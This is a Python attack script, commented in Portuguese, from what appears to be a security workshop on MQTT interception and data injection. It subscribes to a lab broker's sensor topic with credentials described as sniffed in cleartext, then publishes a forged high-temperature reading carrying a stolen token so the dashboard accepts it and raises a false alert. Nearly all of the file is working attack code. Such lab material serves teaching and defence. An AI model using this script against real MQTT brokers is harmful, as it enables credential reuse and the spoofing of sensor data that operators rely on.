#!/usr/bin/env python3
# ============================================================
# ATACANTE - atacante.py
# Workshop 04: Ataques de Interceptacao e Injecao de Dados em MQTT
#
# Executa no KALI (Maquina B) contra o broker do srvdocker01.
# Duas fases:
#
#   Fase A - SNIFFING (reconhecimento):
#       Assina o topico sensores/camara1/temperatura (que nao exige
#       permissao especial) e captura a estrutura dos payloads JSON.
#       Na pratica, com MQTT sem TLS e sem ACL, QUALQUER cliente
#       autenticado (ou ate anonimo, se permitido) consegue escutar.
#
#   Fase B - INJECAO (spoofing):
#       Publica um payload FALSO com temperatura alta no MESMO topico,
#       usando as credenciais (usuario/senha) e o TOKEN capturados
#       no sniffing. A aplicacao (dashboard) aceita o dado como
#       legitimo e dispara o alerta -> manipulacao de leituras.
#
# Uso:  python3 atacante.py [IP_BROKER]
# ============================================================
import json
import sys
import time

import paho.mqtt.client as mqtt

# --- Configuracao -------------------------------------------------
BROKER = sys.argv[1] if len(sys.argv) > 1 else "172.30.234.55"
PORT = 1883

TOPICO = "sensores/camara1/temperatura"

# Credenciais e token CAPTURADOS no sniffing (Fase 2 do roteiro:
# vistos no Wireshark/tshark em texto claro). Em um ataque real,
# o atacante extrai estes valores da captura de rede.
USER_CAPTURADO = "sensor_camara1"
PASS_CAPTURADO = "sensor_senha_2024"
TOKEN_CAPTURADO = "tok_sensor_camara1_7f3a9c"

VALOR_INJETADO = 99.5  # temperatura falsa (fora do normal)


# --- Fase A: Sniffing ---------------------------------------------
def sniff(tempo=8):
    print(f"[ATACANTE] Fase A - Sniffing: assinando '{TOPICO}' por {tempo}s...")
    print("[ATACANTE] Autenticando com as CREDENCIAIS capturadas no tcpdump (Fase 2)...")
    capturas = []

    def on_message(client, userdata, msg):
        payload = msg.payload.decode()
        capturas.append(payload)
        print(f"[ATACANTE] [SNIFF] {msg.topic}: {payload}")

    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
    client.on_message = on_message
    client.username_pw_set(USER_CAPTURADO, PASS_CAPTURADO)  # credencial roubada
    client.connect(BROKER, PORT, 60)
    client.subscribe(TOPICO, qos=0)
    client.loop_start()
    time.sleep(tempo)
    client.loop_stop()
    client.disconnect()

    if not capturas:
        print("[ATACANTE] Nenhum dado capturado. O sensor esta rodando?")
        return {}
    print(f"[ATACANTE] Sniffing concluido: {len(capturas)} payloads capturados.\n")
    return capturas


# --- Fase B: Injecao ----------------------------------------------
def injetar():
    payload_falso = {
        "sensor": "camara1",
        "metrica": "temperatura",
        "valor": VALOR_INJETADO,
        "unidade": "C",
        "token": TOKEN_CAPTURADO,  # token roubado = passa na validacao!
        "timestamp": int(time.time()),
    }
    print(f"[ATACANTE] Fase B - Injetando payload FALSO ({VALOR_INJETADO}C) em '{TOPICO}'...")
    print(f"[ATACANTE] payload: {json.dumps(payload_falso)}")

    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
    client.username_pw_set(USER_CAPTURADO, PASS_CAPTURADO)  # credencial roubada
    client.connect(BROKER, PORT, 60)
    client.publish(TOPICO, json.dumps(payload_falso), qos=0)
    client.disconnect()
    print("[ATACANTE] Payload falso publicado. Confira o log do dashboard (docker logs -f).\n")


# --- Main ---------------------------------------------------------
if __name__ == "__main__":
    print(f"[ATACANTE] Alvo: {BROKER}:{PORT}\n")
    sniff()
    injetar()
